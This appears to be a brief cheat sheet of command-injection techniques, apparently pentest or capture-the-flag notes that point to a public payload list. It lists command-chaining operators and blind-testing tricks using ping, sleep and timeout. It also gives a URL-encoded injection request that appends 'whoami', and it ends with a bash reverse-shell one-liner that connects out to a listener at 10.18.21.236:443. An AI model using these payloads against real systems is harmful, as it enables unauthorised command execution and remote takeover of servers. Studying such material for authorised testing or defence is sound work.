https://github.com/payloadbox/command-injection-payload-list


`; & &&`      will combine several commands and execute them all


If blind:
ping and sleep can be used for testing and getting a delay
`>`               redirect to file that we might be able to read
`timeout /t <timeoutinseconds> [/nobreak]` windows

To try and find blind
`curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`

Reverse shell:
`/bin/bash -i >& /dev/tcp/10.18.21.236/443 0>&1`